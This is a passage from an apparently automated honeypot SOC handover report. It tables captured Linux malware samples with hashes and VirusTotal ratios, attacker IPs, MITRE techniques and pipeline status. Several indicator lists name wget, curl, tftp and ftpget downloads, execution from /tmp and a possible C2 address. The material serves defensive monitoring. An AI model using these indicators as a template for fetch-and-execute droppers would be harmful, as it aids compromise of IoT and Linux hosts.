| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `181.129.31[.]42` | CO | UNE EPM TELECOMUNICACIONES S.A. | **100** ⚠️ | 50 |
| `34.79.245[.]31` | BE | Google LLC | **100** ⚠️ | 0 |
| `196.189.124[.]229` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `114.30.223[.]119` | KR | HVHonam | **100** ⚠️ | 50 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `47.85.8[.]171` | US | Alibaba Cloud LLC | **100** ⚠️ | 50 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 5 |
| `172.245.106[.]112` | US | RackNerd LLC | **100** ⚠️ | 24 |
| `66.132.172[.]220` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `217.24.185[.]98` | RU | INSYS LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 260 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 229 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 129 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 129 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 126 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 390 cases |
| Tool 34  | Credential Extractor        | ✅ 263 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 151 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (9.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 93 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 228 priority case(s) shown individually · 47 recon entry/entries in table (23 group(s) consolidating 100 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T10:04:27Z_
